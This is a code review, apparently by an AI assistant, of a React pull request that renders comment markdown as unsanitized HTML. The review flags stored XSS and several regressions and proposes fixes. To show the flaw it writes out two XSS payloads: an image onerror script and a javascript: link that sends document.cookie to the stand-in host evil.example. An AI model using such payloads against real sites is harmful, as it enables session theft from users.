## PR Review: Markdown in comments + participant count

**Verdict: ❌ Request changes**: comment bodies are rendered as raw HTML with no sanitizing, which is a stored XSS hole, and `CommentList` has an unrelated regression that stops it refetching when `postId` changes.

The PR adds a small regex markdown renderer, uses it for bios (sanitized) and comments (not sanitized), and adds a `Participants` component plus `moment`.

### 1. 🔴 Fix `CommentList`: sanitize comment HTML and restore the effect it replaced
Comments now go through `renderMarkdown` into `dangerouslySetInnerHTML` without `sanitize()`. `renderMarkdown` never escapes HTML, so any HTML in a comment reaches the page unchanged. Separately, the PR deleted a working `useEffect` (the `[postId]` dependency and the cancel flag) without saying why.

**Breaks when:** a user posts the comment `<img src=x onerror=alert(document.cookie)>`. `renderMarkdown` returns it unchanged, and the script runs for everyone who opens the thread. `[x](javascript:location='//evil.example/?'+document.cookie)` also becomes a live `javascript:` link. `Bio.tsx:6` already does this correctly, and `src/sanitize.ts` says it must be used "before it is ever passed to dangerouslySetInnerHTML".
- `src/components/CommentList.tsx:19`: `renderMarkdown(c.body)` goes into `dangerouslySetInnerHTML` without `sanitize()`, which is stored XSS.
- `src/markdown.ts:5-11`: no HTML escaping before the regexes, so ordinary text breaks even in the sanitized Bio. I checked that "if a<b and c>d then" renders as "if a **d then"**: "b and c" is read as a `<b>` tag and lost.
- `src/components/CommentList.tsx:10-12`: deps went from `[postId]` to `[]` and the cancel guard was removed. If the component stays mounted while `postId` changes (moving from post A to post B in the SPA), the thread keeps showing post A's comments. The lint config only enables `rules-of-hooks`, so `exhaustive-deps` won't flag this.
- `src/components/CommentList.tsx:16-17`: `key={c.id}` became `key={i}`. Nothing shows wrong today, but it's an unexplained regression. Put it back.

**Fix:** in `renderMarkdown`, escape `&`, `<`, `>` and `"` first, before the markdown regexes, and allow only `http:`/`https:` link targets. In `CommentList`, wrap the output in `sanitize()` just as `Bio` does, and revert the effect and key to what `main` has:
```tsx
useEffect(() => {
  let cancelled = false;
  fetchComments(postId).then((c) => { if (!cancelled) setComments(c); });
  return () => { cancelled = true; };
}, [postId]);
```

### 2. 🟡 Wire up `Participants` properly, drop `moment`, and test the renderer
- `src/components/Participants.tsx`: nothing imports or renders it, so the "participants line above the thread" in the description never appears. `CommentList` owns the `comments` state, so it has to render `<Participants comments={comments} />` itself, or the state needs to move up a level.
- `src/components/Participants.tsx:6-8`: `filter` + `findIndex` is O(n²) and runs on every render. On a 5,000-comment thread with many different authors I measured about 50 ms per render. `new Set(comments.map((c) => c.author.id)).size` makes it O(n), and you can wrap it in `useMemo` too.
- `package.json:9` / `Participants.tsx:1,13`: this adds `moment` (large, maintenance-only) even though `date-fns` is already installed and `src/format.ts` exports `relativeTime()`, which gives the same "3 hours ago" text. Use `relativeTime` and remove `moment`.
- `src/components/Participants.tsx:9`: ❓ does `/api/posts/:id/comments` return comments oldest-first? If not, `comments[comments.length - 1]` isn't the last reply.
- `src/__tests__/markdown.test.ts`: there's only one bold test. Add cases for HTML escaping (`<img onerror>`, `a<b`), links including a `javascript:` URL, italic and code, plus a test for the `Participants` count with repeated authors. The XSS case would have caught finding 1.
- PR description: mention the `CommentList` effect and key changes, or better, drop them from this PR.

Optional: "1 people joined the discussion" needs a singular form.

**Scorecard:** Correctness ❌ · Security ❌ · Testing ⚠️ · Readability ✅ · Performance ⚠️ · Conventions ⚠️ · PR quality ⚠️
**Checked:** I didn't run `npm test`, `lint` or `typecheck` because there's no `node_modules`, and installing wasn't allowed. I ran the `renderMarkdown` regexes and the unique-author logic in plain node to confirm the XSS output, the `a<b` breakage and the ~50 ms timing. A second, independent pass confirmed every finding. Repo has no CI or CLAUDE.md/CONTRIBUTING.
